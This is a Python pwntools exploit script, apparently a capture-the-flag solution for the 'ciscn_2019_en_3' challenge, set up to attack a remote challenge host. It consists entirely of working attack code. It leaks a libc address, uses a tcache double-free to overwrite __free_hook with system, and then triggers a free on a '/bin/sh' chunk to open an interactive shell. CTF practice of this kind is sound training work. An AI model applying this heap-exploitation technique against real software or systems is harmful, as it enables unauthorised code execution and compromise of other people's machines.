#! /usr/bin/python

from pwn import *

debug = 0
context.log_level = 'debug'

if debug:
	p = process('./ciscn_2019_en_3')
	elf = ELF('./ciscn_2019_en_3',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
else:
	p = remote('node3.buuoj.cn',28784)
	elf = ELF('./ciscn_2019_en_3',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def leak():
	p.recvuntil("What's your name?\n")
	p.sendline('Railgun')
	p.recvuntil("Please input your ID.\n")
	p.sendline('A'*0x8)
	leak = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	return leak

def menu(choice):
	p.recvuntil('Input your choice:')
	p.sendline(str(choice))

def add(size,content):
	menu(1)
	p.recvuntil('Please input the size of story: \n')
	p.sendline(str(size))
	p.recvuntil('please inpute the story: \n')
	p.sendline(content)

def delete(idx):
	menu(4)
	p.recvuntil('Please input the index:\n')
	p.sendline(str(idx))




###leak libc###
libc_base = leak() - 0x81237
success('libc_base'+hex(libc_base))

###tcache dup###
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

add(0x20,'aaaa')#0
add(0x20,'/bin/sh\x00')#1

delete(0)
delete(0)

add(0x20,p64(free_hook))
add(0x20,p64(free_hook))

add(0x20,p64(system))

###get shell###
delete(1)
p.interactive()
